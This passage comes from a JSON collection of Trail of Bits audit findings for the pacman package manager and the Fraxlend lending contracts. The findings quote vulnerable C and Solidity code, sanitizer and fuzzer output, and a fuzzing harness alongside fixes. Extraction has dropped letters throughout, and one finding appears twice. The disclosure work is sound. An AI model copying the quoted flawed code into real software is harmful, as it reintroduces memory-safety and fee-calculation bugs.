et al. == 2084 == Using Valgrind -3.21.0 and LibVEX; rerun with -h for copyright info == 2084 == Command: ./pacman -S --print --print-format %s valgrind == 2084 == == 2084 == Invalid read of size 1 == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == Address 0x65e61d0 is 0 bytes inside a block of size 3 free'd == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == Block was alloc'd at == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == == 2084 == ... ==2084== ERROR SUMMARY: 50 errors from 40 contexts (suppressed: 0 from 0) at 0x4841848 : malloc (vg_replace_malloc.c: 431 ) by 0x4A183DE : strdup (strdup.c: 42 ) by 0x125ACB : print_packages (util.c: 1198 ) by 0x11F9DA : sync_prepare_execute (sync.c: 817 ) by 0x11F550 : sync_trans (sync.c: 728 ) by 0x11FF72 : pacman_sync (sync.c: 965 ) by 0x11B5EB : main (pacman.c: 1259 ) at 0x484412F : free (vg_replace_malloc.c: 974 ) by 0x1261F2 : print_packages (util.c: 1264 ) by 0x11F9DA : sync_prepare_execute (sync.c: 817 ) by 0x11F550 : sync_trans (sync.c: 728 ) by 0x11FF72 : pacman_sync (sync.c: 965 ) by 0x11B5EB : main (pacman.c: 1259 ) Figure 1.3: Detecting the bug with Valgrind Exploit Scenario Pacman starts using multiple threads, uses the print_packages function in one thread, and performs an allocation of a similar size to the freed temp variable in another thread. An attacker with the ability to control the contents of the latter allocation exploits the program by manipulating its heap memory through the vulnerable code path. Recommendations Short term, add an assignment of temp = string; after the temp variable is freed in the vulnerable code path in the print_packages function. This will prevent the use-after-free issue. Long term, regularly scan the code with static analyzers like scan-build.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Null pointer dereferences ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "The cb_progress function rst checks whether the pkgname variable is a null pointer in a ternary operator (highlighted line 1 in gure 2.1) and then may use pkgname to format a string (highlighted lines 2 and 3 in gure 2.1). This leads to a crash if pkgname is a null pointer. void cb_progress( void *ctx, alpm_progress_t event, const char *pkgname, int percent, size_t howmany, size_t current) { ... len = strlen(opr) + ((pkgname) ? strlen(pkgname) : 0 ) + 2 ; wcstr = calloc(len, sizeof ( wchar_t )); /* print our strings to the alloc'ed memory */ #if defined(HAVE_SWPRINTF) wclen = swprintf(wcstr, len, L \"%s %s\" , opr, pkgname); #else /* because the format string was simple, we can easily do this without * using swprintf, although it is probably not as safe/fast. The max * chars we can copy is decremented each time by subtracting the length * of the already printed/copied wide char string. */ // <--- (1) // <--- (2) wclen = mbstowcs(wcstr, opr, len); wclen += mbstowcs(wcstr + wclen, \" \" , len - wclen); wclen += mbstowcs(wcstr + wclen, pkgname, len - wclen); #endif // <--- (3) Figure 2.1: pacman/src/pacman/callback.c#L656660 The severity of this nding has been set to informational because if the cb_progress function were called with a null pointer, the program crash would be evident to program users and developers. An additional case of null pointer dereference is present in the _alpm_chroot_write_to_child() function if the out_cb argument is null (gure 2.2). typedef ssize_t (*_alpm_cb_io)( void *buf, ssize_t len, void *ctx); // [...] static int _alpm_chroot_write_to_child (alpm_handle_t *handle, int fd, char *buf, ssize_t *buf_size, ssize_t buf_limit, _alpm_cb_io out_cb , void *cb_ctx) { ssize_t nwrite; if (*buf_size == 0 ) { /* empty buffer, ask the callback for more */ if ((*buf_size = out_cb(buf, buf_limit, cb_ctx) ) == 0 ) { /* no more to write, close the pipe */ return -1 ; } } Figure 2.2: pacman/lib/libalpm/util.c#L469481 Recommendations Short term, modify the cb_progress and _alpm_chroot_write_to_child functions so that the above-noted pointers are checked for a null value before they are used. In the event of a null pointer, abort without dereferencing. Long term, use static analysis tools to detect cases where pointers are dereferenced without a preceding null check.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Allocation failures can lead to memory leaks or null pointer dereferences ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "There are a few code paths where allocation failures can lead to further memory leaks or null pointer dereferences:  If the strdup(path) functions allocation fails in the setdefaults function (highlighted lines 1 and 2 in gure 3.1), then the memory pointed to by the rootdir variable (highlighted line 2 in gure 3.1) would be leaked. This is because the SETDEFAULT macro would enter its error path and return -1 (highlighted line 3 in gure 3.1), not freeing the previously allocated memory. int setdefaults (config_t *c) { alpm_list_t *i; #define SETDEFAULT(opt, val) \\ if(!opt) { \\ opt = val; \\ if(!opt) { return -1; } \\ } if (c->rootdir) { char * rootdir = strdup(c->rootdir); ... char path[PATH_MAX]; if (!c->dbpath) { // (3) // (2) snprintf(path, PATH_MAX, \"%s/%s\" , rootdir, &DBPATH[ 1 ]); SETDEFAULT(c->dbpath, strdup(path)); // (1) } if (!c->logfile) { snprintf(path, PATH_MAX, \"%s/%s\" , rootdir, &LOGFILE[ 1 ]); SETDEFAULT(c->logfile, strdup(path)); // (1) } Figure 3.1: pacman/src/pacman/conf.c#L1139  1153  The alpm_list_equal_ignore_order function added in MR #96 fails to check whether the calloc function returns a non-null value (gure 3.2). If calloc returned NULL , this would lead to a null pointer dereference later in the function (line 534 of gure 3.2). 511 512 513 { 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 int SYMEXPORT alpm_list_equal_ignore_order ( const alpm_list_t *left, const alpm_list_t *right, alpm_list_fn_cmp fn) const alpm_list_t *l = left; const alpm_list_t *r = right; int *matched; if ((l == NULL ) != (r == NULL )) { return 0 ; } if (alpm_list_count(l) != alpm_list_count(r)) { return 0 ; } matched = calloc(alpm_list_count(right), sizeof ( int )); for (l = left; l; l = l->next) { int found = 0 ; int n = 0 ; for (r = right; r; r = r->next, n++) { /* make sure we don't match the same value twice */ if (matched[n]) { continue ; } Figure 3.2: MR #96: lib/libalpm/alpm_list.c#L511  536  In the _alpm_validate_filename() function, the strlen(filename) function can be called with a null pointer if the READ_AND_STORE(pkg->filename) execution fails to allocate memory through the STRDUP macro (gure 3.3). #define READ_AND_STORE(f) do { \\ READ_NEXT(); \\ STRDUP(f, line, goto error); \\ } while(0) #define STRDUP(r, s, action) do { \\ if(s != NULL) { \\ r = strdup(s); \\ if(r == NULL) { \\ _alpm_alloc_fail(strlen(s)); \\ action; \\ } } \\ else { r = NULL; } } \\ while(0) READ_AND_STORE(pkg->filename); if (_alpm_validate_filename(db, pkg->name, pkg->filename) < 0 ) { ... } Figure 3.3: pacman/lib/libalpm/be_sync.c#L591  595 The severity of this nding has been set to informational because if an allocation failed, the program would likely stop functioning properly since it would fail to allocate any more memory anyway. The rst part of this issue (pertaining to the conf.c le, rather than the alpm_list.c le) was found with the scan-build static analyzer. Recommendations Short term, to x the memory leaks and null pointer dereferences, add null-pointer checks after the allocations and before the dereferences. Long term, regularly scan the code with static analyzers like scan-build to detect missing checks of these types. 4. Bu\u0000er overow read in string_length utility function Severity: Undetermined Diculty: High Type: Data Validation Finding ID: TOB-PACMAN-4 Target: src/pacman/util.c",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Undened behavior or potential null pointer dereferences ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "There are a few code paths where a null pointer dereference or undened behavior may occur if certain conditions are met. Those issues can be detected with the scan-build static analyzer or by building and running Pacman with UndenedBehaviorSanitizer (UBSan). The scan-build results were shared along with this report. One of the code paths found by scan-build is in the lib/libalpm/remove.c le. The closedir(dir) function may be called with a null pointer when the condition that calls regcomp(...) is true (gure 5.1). This is undened behavior since the closedir function argument is marked as non-null. static void shift_pacsave (alpm_handle_t *handle, const char *file) { DIR *dir = NULL ; ... if (regcomp(&reg, regstr, REG_EXTENDED | REG_NEWLINE) != 0 ) { goto cleanup; } dir = opendir(dirname); // <-- the dir was only modified here ... cleanup : free(dirname); closedir(dir); Figure 5.1: pacman/lib/libalpm/remove.c#L349  423 Another case is in the mount_point_list function (gure 5.2). If the STRDUP macro is executed with a mnt->mnt_dir null pointer, then the strlen(mp->mount_dir) call will take a null pointer. static alpm_list_t * mount_point_list (alpm_handle_t *handle) { ... #if defined(HAVE_GETMNTENT) && defined(HAVE_MNTENT_H) ... while ((mnt = getmntent(fp))) { ALPM_ERR_MEMORY, NULL )); CALLOC(mp, 1 , sizeof (alpm_mountpoint_t), RET_ERR(handle, STRDUP(mp->mount_dir, mnt->mnt_dir, free(mp); RET_ERR(handle, ALPM_ERR_MEMORY, NULL )); mp->mount_dir_len = strlen( mp->mount_dir ); Figure 5.2: pacman/lib/libalpm/diskspace.c#L95  116 In addition, gure 5.3 shows a run of Pacman with UBSan that detects other cases of this issue. # CFLAGS=-fsanitize=address,undefined LDFLAGS=-fsanitize=address,undefined meson setup sanitize # cd sanitize # CFLAGS=-fsanitize=address,undefined LDFLAGS=-fsanitize=address,undefined meson compile # ./pacman -Syuu :: Synchronizing package databases... core downloading... extra downloading... :: Starting full system upgrade... ../lib/libalpm/util.c:1149:9: runtime error: null pointer passed as argument 1, which is declared to never be null ../lib/libalpm/util.c:1151:10: runtime error: null pointer passed as argument 1, which is declared to never be null ../lib/libalpm/util.c:1192:4: runtime error: null pointer passed as argument 2, which is declared to never be null ... :: Proceed with installation? [Y/n] Y ... Figure 5.3: Running Pacman with UBSan Recommendations Short term, x the cases where functions marked with non-null arguments are called with null pointers by putting the function calls inside if statements that perform null checks. Long term, regularly test Pacman with UBSan and scan its codebase with static analyzers such as scan-build.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. Undened behavior from use of atoi ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "The atoi function is used to convert strings to integers when parsing local database les and command-line arguments (gures 6.1 and 6.2). The behavior of atoi is undened in the case where the input string is not a valid formatted number or in the case of an overow. The severity of this nding has been set to informational because, in practice, atoi will typically return a dummy value, such as 0 or -1 , in the case of an incorrect input or an overow. } else if (strcmp(line, \"%REASON%\" ) == 0 ) { READ_NEXT(); info->reason = (alpm_pkgreason_t) atoi(line) ; Figure 6.1: Use of atoi ( lib/libalpm/be_local.c#L774  776 ) case OP_ASK : config->noask = 1 ; config->ask = ( unsigned int ) atoi(optarg) ; break ; ... case OP_DEBUG : /* debug levels are made more 'human readable' than using a raw logmask * here, error and warning are set in config_new, though perhaps a * --quiet option will remove these later */ if (optarg) { unsigned short debug = ( unsigned short ) atoi(optarg) ; switch (debug) { case 2 : config->logmask |= ALPM_LOG_FUNCTION; __attribute__((fallthrough)); case 1 : config->logmask |= ALPM_LOG_DEBUG; break ; default : pm_printf(ALPM_LOG_ERROR, _( \"'%s' is not a valid debug optarg); level\\n\" ), } } else { return 1 ; config->logmask |= ALPM_LOG_DEBUG; } /* progress bars get wonky with debug on, shut them off */ config->noprogressbar = 1 ; break ; Figure 6.2: Uses of atoi ( src/pacman/pacman.c#L382  430 ) Recommendations Short term, use the strtol function instead of atoi . After calling strtol , check the errno value for a failed conversion. Make sure to perform bounds checking when casting the long value returned by strtol down to an int .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Database parsers fail silently if an option is not recognized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "The sync_db_read and local_db_read functions, which are responsible for parsing sync database les and local database les respectively, fail silently if an option is not recognized. This can cause a conguration option to not be set, which may cause issues if, for example, the local installation of Pacman is out of date and does not support newly added conguration options. Exploit Scenario Support for SHA-3 hash verication is added, along with a corresponding conguration option, %SHA3SUM% . Older installations of Pacman, which do not support this conguration option, will ignore it. This causes package hashes to not be veried. Recommendations Short term, add default behavior in the sync_db_read and local_db_read functions for when a conguration option is not recognized. Unrecognized options should cause a log message or an error.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Cache cleaning function may delete the wrong les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "In the sync_cleancache function, a path is constructed for deletion using the snprintf function. A maximum path length of PATH_MAX is given (on Linux, this value is 4096 characters). However, there is no check to ensure that the path created by snprintf was not cut short by the limit. This can lead to deletion of a dierent path than intended. The severity of this nding has been set to informational because it is highly unlikely that Pacman would use a path this long in practice. /* build the full filepath */ snprintf(path, PATH_MAX, \"%s%s\" , cachedir, ent->d_name); /* short circuit for removing all files from cache */ if (level > 1 ) { ret += unlink_verbose(path, 0 ); continue ; } Figure 8.1: Path creation and le deletion ( pacman/src/pacman/sync.c#L241  248 ) Recommendations Short term, add a check that compares the value returned by snprintf and ensures that it is less than PATH_MAX .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Integer underow in a length check leads to out-of-bounds read in alpm_extract_keyid ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "The alpm_extract_keyid function (gure 9.1) contains an out-of-bounds read issue due to an integer underow in the length_check function when a specically crafted input is provided (gure 9.2). int SYMEXPORT alpm_extract_keyid (alpm_handle_t *handle, const char *identifier, const unsigned char *sig, const size_t len, alpm_list_t **keys) { size_t pos, blen, hlen, ulen; pos = 0 ; while (pos < len) { if (!(sig[pos] & 0x80 )) { ... - return signature format error } if (sig[pos] & 0x40 ) { /* new packet format */ if (length_check(len, pos, 1 , handle, identifier) != 0 ) { return -1 ; } pos = pos + 1 ; Figure 9.1: pacman/lib/libalpm/signing.c#L1101  1223 /* Check to avoid out of boundary reads */ static size_t length_check ( size_t length, size_t position, size_t a, alpm_handle_t *handle, const char *identifier) { if ( a == 0 || length - position <= a ) { _alpm_log(handle, ALPM_LOG_ERROR, _( \"%s: signature format error\\n\" ), identifier); return -1 ; } else { return 0 ; } } Figure 9.2: pacman/lib/libalpm/signing.c#L1043  The length_check function is used to conrm whether advancing a position ( pos ) index is safe. It is used by alpm_extract_keyid , for example, in the following way: length_check(len, pos, 2, handle, identifier) The len variable is the length of the signature buer ( sig ), and pos is an index in that buer. However, the pos index can be bigger than the len variable, and when that happens, the length-position computation in the length_check function underows and the function returns 0 , leading to the out-of-bounds read. We found this issue by fuzzing the alpm_extract_keyid function. The fuzzing harness code is included in appendix D . Recommendations Short term, x the integer underow issue in the length_check function by changing the highlighted if statement in gure 9.2 to the following: if ( a == 0 || (position <= length && length - position <= a) ) This will prevent out-of-bounds reads in the alpm_extract_keyid function. Long term, fuzz the Pacman functions, as shown in appendix D , for example. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. Allocation failures can lead to memory leaks or null pointer dereferences ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "There are a few code paths where allocation failures can lead to further memory leaks or null pointer dereferences:  If the strdup(path) functions allocation fails in the setdefaults function (highlighted lines 1 and 2 in gure 3.1), then the memory pointed to by the rootdir variable (highlighted line 2 in gure 3.1) would be leaked. This is because the SETDEFAULT macro would enter its error path and return -1 (highlighted line 3 in gure 3.1), not freeing the previously allocated memory. int setdefaults (config_t *c) { alpm_list_t *i; #define SETDEFAULT(opt, val) \\ if(!opt) { \\ opt = val; \\ if(!opt) { return -1; } \\ } if (c->rootdir) { char * rootdir = strdup(c->rootdir); ... char path[PATH_MAX]; if (!c->dbpath) { // (3) // (2) snprintf(path, PATH_MAX, \"%s/%s\" , rootdir, &DBPATH[ 1 ]); SETDEFAULT(c->dbpath, strdup(path)); // (1) } if (!c->logfile) { snprintf(path, PATH_MAX, \"%s/%s\" , rootdir, &LOGFILE[ 1 ]); SETDEFAULT(c->logfile, strdup(path)); // (1) } Figure 3.1: pacman/src/pacman/conf.c#L1139  1153  The alpm_list_equal_ignore_order function added in MR #96 fails to check whether the calloc function returns a non-null value (gure 3.2). If calloc returned NULL , this would lead to a null pointer dereference later in the function (line 534 of gure 3.2). 511 512 513 { 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 int SYMEXPORT alpm_list_equal_ignore_order ( const alpm_list_t *left, const alpm_list_t *right, alpm_list_fn_cmp fn) const alpm_list_t *l = left; const alpm_list_t *r = right; int *matched; if ((l == NULL ) != (r == NULL )) { return 0 ; } if (alpm_list_count(l) != alpm_list_count(r)) { return 0 ; } matched = calloc(alpm_list_count(right), sizeof ( int )); for (l = left; l; l = l->next) { int found = 0 ; int n = 0 ; for (r = right; r; r = r->next, n++) { /* make sure we don't match the same value twice */ if (matched[n]) { continue ; } Figure 3.2: MR #96: lib/libalpm/alpm_list.c#L511  536  In the _alpm_validate_filename() function, the strlen(filename) function can be called with a null pointer if the READ_AND_STORE(pkg->filename) execution fails to allocate memory through the STRDUP macro (gure 3.3). #define READ_AND_STORE(f) do { \\ READ_NEXT(); \\ STRDUP(f, line, goto error); \\ } while(0) #define STRDUP(r, s, action) do { \\ if(s != NULL) { \\ r = strdup(s); \\ if(r == NULL) { \\ _alpm_alloc_fail(strlen(s)); \\ action; \\ } } \\ else { r = NULL; } } \\ while(0) READ_AND_STORE(pkg->filename); if (_alpm_validate_filename(db, pkg->name, pkg->filename) < 0 ) { ... } Figure 3.3: pacman/lib/libalpm/be_sync.c#L591  595 The severity of this nding has been set to informational because if an allocation failed, the program would likely stop functioning properly since it would fail to allocate any more memory anyway. The rst part of this issue (pertaining to the conf.c le, rather than the alpm_list.c le) was found with the scan-build static analyzer. Recommendations Short term, to x the memory leaks and null pointer dereferences, add null-pointer checks after the allocations and before the dereferences. Long term, regularly scan the code with static analyzers like scan-build to detect missing checks of these types.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Bu\u0000er overow read in string_length utility function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "The string_length utility function (gure 4.1) skips ANSI color codes when computing the length. When a string includes the \\033 byte that starts the ANSI color code sequence but does not have the m character that ends it, the function will read memory past the end of the string, causing a buer overow read. This can lead to a program crash or other issues, depending on how the function is used. static size_t string_length ( const char *s) { int len; wchar_t *wcstr; if (!s || s[ 0 ] == '\\0' ) { return 0 ; } if (strstr(s, \"\\033\" )) { char * replaced = malloc( sizeof ( char ) * strlen(s)); int iter = 0 ; for (; *s; s++) { if (*s == '\\033' ) { while (*s != 'm' ) { s++; } } else { replaced[iter] = *s; iter++; } } replaced[iter] = '\\0' ; Figure 4.1: pacman/src/pacman/util.c#L452  473 Recommendations Short term, so that the loop terminates at a null character, change the conditional within the while() statement in the string_length function to the following: while (*s && *s != 'm' ) Long term, implement a fuzzing harness for the string_length function to ensure it does not contain any bugs. An example harness code can be found in gure 4.2; this can be compiled and run using the following commands: clang -fsanitize=fuzzer,address main.c -ggdb -o fuzzer ./fuzzer #define _XOPEN_SOURCE #include <stdio.h> #include <stdlib.h> #include <stdint.h> #include <string.h> #include <wchar.h> static size_t string_length( const char *s) { ... } int LLVMFuzzerTestOneInput ( const uint8_t *Data, size_t Size) { if (Size == 0 ) return 0 ; // Prepare a null terminated string char * x = malloc(Size+ 1 ); memcpy(x, Data, Size); x[Size] = 0 ; string_length(x); free(x); return 0 ; } Figure 4.2: Example fuzzing harness that uses libFuzzer to test the string_length function Figure 4.3 shows an example output of such a fuzzer. We also implemented this harness as part of the Pacman codebase, as detailed in appendix D . $ clang -fsanitize=fuzzer,address main.c -ggdb -o fuzzer $ ./fuzzer INFO: Running with entropic power schedule (0xFF, 100). INFO: Seed: 1790240281 INFO: Loaded 1 modules (12 inline 8-bit counters): 12 [0x56046acc5fc0, 0x56046acc5fcc), INFO: Loaded 1 PC tables (12 PCs): 12 [0x56046acc5fd0,0x56046acc6090), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes INFO: A corpus is not provided, starting from an empty corpus #2 ... #173 REDUCE cov: 5 ft: 6 corp: 2/2b lim: 4 exec/s: 0 rss: 31Mb L: 1/1 MS: 1 ================================================================= INITED cov: 4 ft: 5 corp: 1/1b exec/s: 0 rss: 30Mb ==2873139==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000006b53 at pc 0x56046ac84a76 bp 0x7ffd09e07ef0 sp 0x7ffd09e07ee8 READ of size 1 at 0x602000006b53 thread T0 #0 0x56046ac84a75 in string_length /fuzz/main.c:21:11 #1 0x56046ac8483d in LLVMFuzzerTestOneInput /fuzz/main.c:56:2 #2 0x56046abad383 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/fuzz/fuzzer+0x3e383) (BuildId: 65f386451dc943b740358c52379831570eef52be)  0x602000006b53 is located 0 bytes to the right of 3-byte region [0x602000006b50,0x602000006b53) allocated by thread T0 here: #0 0x56046ac499fe in malloc (/fuzz/fuzzer+0xda9fe) (BuildId: 65f386451dc943b740358c52379831570eef52be) #1 0x56046ac847db in LLVMFuzzerTestOneInput /root/fuz/main.c:53:12 ... SUMMARY: AddressSanitizer: heap-buffer-overflow /root/fuz/main.c:21:11 in string_length ... Figure 4.3: Output from the fuzzer from gure 4.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The owner of a contract that inherits from the FraxlendPairCore contract can be changed through a call to the transferOwnership function. This function internally calls the _setOwner function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _setOwner(newOwner); } function _setOwner ( address newOwner ) private { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 1.1: OpenZeppelins OwnableUpgradeable contract Exploit Scenario Alice, a Frax Finance administrator, invokes the transferOwnership function to change the address of an existing contracts owner but mistakenly submits the wrong address. As a result, ownership of the contract is permanently lost. Recommendations Short term, implement ownership transfer operations that are executed in a two-step process, in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Missing checks of constructor/initialization parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "In the Fraxlend protocols constructor function, various settings are congured; however, two of the conguration parameters do not have checks to validate the values that they are set to. First, the _liquidationFee parameter does not have an upper limit check: constructor ( bytes memory _configData, bytes memory _immutables, uint256 _maxLTV , uint256 _liquidationFee , uint256 _maturityDate , uint256 _penaltyRate , bool _isBorrowerWhitelistActive , bool _isLenderWhitelistActive ) { [...] cleanLiquidationFee = _liquidationFee; dirtyLiquidationFee = (_liquidationFee * 90000 ) / LIQ_PRECISION; // 90 % of clean fee Figure 2.1: The constructor functions parameters in FraxlendPairCore.sol#L193-L194 Second, the Fraxlend system can work with one or two oracles; however, there is no check to ensure that at least one oracle is set: constructor ( bytes memory _configData, bytes memory _immutables, uint256 _maxLTV , uint256 _liquidationFee , uint256 _maturityDate , uint256 _penaltyRate , bool _isBorrowerWhitelistActive , bool _isLenderWhitelistActive ) { // [...] // Oracle Settings { IFraxlendWhitelist _fraxlendWhitelist = IFraxlendWhitelist(FRAXLEND_WHITELIST_ADDRESS); // Check that oracles are on the whitelist if (_oracleMultiply != address ( 0 ) && !_fraxlendWhitelist.oracleContractWhitelist(_oracleMultiply)) { revert NotOnWhitelist(_oracleMultiply); } if (_oracleDivide != address ( 0 ) && !_fraxlendWhitelist.oracleContractWhitelist(_oracleDivide)) { revert NotOnWhitelist(_oracleDivide); } // Write oracleData to storage oracleMultiply = _oracleMultiply; oracleDivide = _oracleDivide; oracleNormalization = _oracleNormalization; Figure 2.2: The constructor functions body in FraxlendPairCore.sol#L201-L214 Exploit Scenario Bob deploys a custom pair with a miscongured _configData argument in which no oracle is set. As a consequence, the exchange rate is incorrect. Recommendations Short term, add an upper limit check for the _liquidationFee parameter, and add a check for the _configData parameter to ensure that at least one oracle is set. The checks can be added in either the FraxlendPairCore contract or the FraxlendPairDeployer contract. Long term, add appropriate requirements to values that users set to decrease the likelihood of user error.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Incorrect application of penalty fee rate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "A Fraxlend pair can have a maturity date, after which a penalty rate is applied to the interest to be paid by the borrowers. However, the penalty rate is also applied to the amount of time immediately before the maturity date. As shown in gure 3.1, the _addInterest function checks whether a pair is past maturity. If it is, the function sets the new rate (the _newRate parameter) to the penalty rate (the penaltyRate parameter) and then uses it to calculate the matured interest. The function should apply the penalty rate only to the time between the maturity date and the current time; however, it also applies the penalty rate to the time between the last interest accrual ( _deltaTime ) and the maturity date, which should be subject only to the normal interest rate. function _addInterest () // [...] uint256 _deltaTime = block.timestamp - _currentRateInfo.lastTimestamp; // [...] if (_isPastMaturity()) { _newRate = uint64 (penaltyRate); } else { // [...] // Effects: bookkeeping _currentRateInfo.ratePerSec = _newRate; _currentRateInfo.lastTimestamp = uint64 ( block.timestamp ); _currentRateInfo.lastBlock = uint64 ( block.number ); // Calculate interest accrued _interestEarned = (_deltaTime * _totalBorrow.amount * _currentRateInfo.ratePerSec) / 1e18; Figure 3.1: The _addInterest function in FraxlendPairCore.sol#L406-L494 Exploit Scenario A Fraxlend pairs maturity date is 100, the delta time (the last time interest accrued) is 90, and the current time is 105. Alice decides to repay her debt. The _addInterest function is executed, and the penalty rate is also applied to the interest accrual and the maturity date. As a result, Alice owes more in interest than she should. Recommendations Short term, modify the associated code so that if the _isPastMaturity branch is taken and the _currentRateInfo.lastTimestamp value is less than maturityDate value, the penalty interest rate is applied only for the amount of time after the maturity date. Long term, identify edge cases that could occur in the interest accrual process and implement unit tests and fuzz tests to validate them.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Improper validation of Chainlink data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The current validation of the values returned by Chainlinks latestRoundData function could result in the use of stale data. The latestRoundData function returns the following values: the answer , the roundId (which represents the current round), the answeredInRound value (which corresponds to the round in which the answer was computed), and the updatedAt value (which is the timestamp of when the round was updated). An updatedAt value of zero means that the round is not complete and should not be used. An answeredInRound value that is less than the roundId could indicate stale data. However, the _updateExchangeRate function does not check for these conditions. function _updateExchangeRate () internal returns ( uint256 _exchangeRate ) { // [...] uint256 _price = uint256 (1e36); if (oracleMultiply != address ( 0 )) { (, int256 _answer , , , ) = AggregatorV3Interface(oracleMultiply).latestRoundData(); if (_answer <= 0 ) { revert OracleLTEZero(oracleMultiply); } _price = _price * uint256 (_answer); } if (oracleDivide != address ( 0 )) { (, int256 _answer , , , ) = AggregatorV3Interface(oracleDivide).latestRoundData(); if (_answer <= 0 ) { revert OracleLTEZero(oracleDivide); } _price = _price / uint256 (_answer); } // [...] } Figure 4.1: The _updateExchangeRate function in FraxlendPairCore.sol#L513-L544 Exploit Scenario Chainlink is not updated correctly in the current round, and Eve, who should be liquidated with the real collateral asset price, is not liquidated because the price reported is outdated and is higher than it is in reality. Recommendations Short term, have _updateExchangeRate perform the following sanity check: require(updatedAt != 0 && answeredInRound == roundId) . This check will ensure that the round has nished and that the pricing data is from the current round. Long term, when integrating with third-party protocols, make sure to accurately read their documentation and implement the appropriate sanity checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Risk of oracle outages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "Under extreme market conditions, the Chainlink oracle may cease to work as expected, causing unexpected behavior in the Fraxlend protocol. Such oracle issues have occurred in the past. For example, during the LUNA market crash, the Venus protocol was exploited because Chainlink stopped providing up-to-date prices. The interruption occurred because the price of LUNA dropped below the minimum price ( minAnswer ) allowed by the LUNA/USD price feed on the BNB chain. As a result, all oracle updates reverted. Chainlinks automatic circuit breakers , which will pause price feeds during extreme market conditions, could pose similar problems. Note that these kinds of events cannot be tracked on-chain. If a price feed is paused, updatedAt will still be greater than zero, and answeredInRound will still be equal to roundId . Therefore, the Frax Finance team should implement an o-chain monitoring solution to detect any anomalous behavior exhibited by Chainlink oracles. Recommendations Short term, implement an o-chain monitoring solution that checks for the following conditions and issues alerts if they occur, as they may be indicative of abnormal market events:    An asset price that is approaching the minAnswer or maxAnswer value The suspension of a price feed by an automatic circuit breaker Any large deviations in the price of an asset",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Unapproved lenders could receive fTokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
